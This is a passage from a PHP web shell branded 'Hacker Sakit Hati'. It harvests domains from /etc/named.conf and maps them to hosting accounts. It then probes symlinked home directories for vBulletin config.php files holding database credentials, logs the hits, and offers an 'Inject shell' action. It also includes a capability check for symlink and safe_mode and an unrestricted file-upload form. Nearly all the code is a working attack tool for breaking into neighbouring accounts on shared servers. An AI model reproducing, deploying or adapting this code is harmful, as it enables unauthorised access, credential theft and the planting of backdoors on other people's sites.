<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='http://$config'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
}

}










die();

}

if(!is_file('named.txt')){

$d00m = file("/etc/named.conf");

}else{

$d00m = file("named.txt");


}
if(!$d00m)
{

die ("<meta http-equiv='refresh' content='0; url=?SmlP?sws=read'/>");
}
else

{
echo "<div class='tmp'>
<form method='POST' action='$pg?SmlP?sws=vb'>
<input type='submit' value='Inject shell' />
<input type='hidden' value='1' name='s' />
</form>
<br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";

$f = fopen('vb.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domsws);

if(strlen(trim($domsws[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$wpl=$pageURL."/sym/root/home/".$user['name']."/includes/config.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sym/root/home/".$user['name']."/vb/includes/config.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sym/root/home/".$user['name']."/forum/includes/config.php";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];


////////// vb ////////////

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
$config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
$config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
$config= $wp3;
}
else
{
continue;

}
flush();

/////////////////////////////////////////////////////////////////////////////////////

$dom = $domsws[1][0];

$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}


echo "<tr><td><a href=http://www.".$domsws[1][0].">".$domsws[1][0]."</a></td>
<td><a href='$config'>config</a></td><td>".$r."</td></tr>";





flush();


}
}
}
}








break;

case 'help':

echo "<div class='tmp'>
<table align='center' width='40%'><td>function</td><td>Case</td>";


$safe_mode = ini_get('safe_mode');
if($safe_mode){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>Safe Mode</td><td>$r</td>";

$fun = function_exists('symlink');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function symlink</td><td>$r</td>";


$fun = function_exists('file');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function file</td><td>$r</td>";

$fun = function_exists('file_get_contents');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function file_get_contents</td><td>$r</td>";

$fun = function_exists('mkdir');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function mkdir</td><td>$r</td>";


$fun = is_dir('sym/root');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>Permission denied</td><td>$r</td>";


$fun = preg_match('/Forbidden/',@file_get_contents('sym/root') or !@file_get_contents('sym/root'));
if($fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #006600'>True</b>";}

echo "<tr><td>Forbidden</td><td>$r</td>";




echo "</table></div>";



break;
default:
header("Location: $pg");




}


/// home ///
}else
{


echo '<br /><br /><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" value="Choose file" size="60" ><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<br /><br /><b>Uploaded successful !!<br><br>'; }
else { echo '<br /><br />Not uploaded !!<br><br>'; }


}

echo '
<br /><br /><br>';

}


function ex($text,$a,$b){
$explode = explode($a,$text);
$explode = explode($b,$explode[1]);
return $explode[0];
}



echo '</div>





</body>

</html>
';

?>

<script language="JavaScript1.2">
var message=" ..::[+ Copyright © 2014 Hacker Sakit Hati +]::.. "// jangan pakai enter
var neonbasecolor=" aqua "
var neontextcolor=" white "
var neontextcolor2="pink" // kode warna kedua
var flashspeed=1 // kecepatan flash neon, semakin kecil semakin cepat
var flashingletters=10 // jumlah huruf yang tersorot oleh flash
var flashingletters2=2 // jumlah warna di ekor flash
var flashpause=1
///edit by http://googel-indonesia.blogspot.com/
var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
function neon(){
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor

if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script> </center> <br>

</body>

</html>
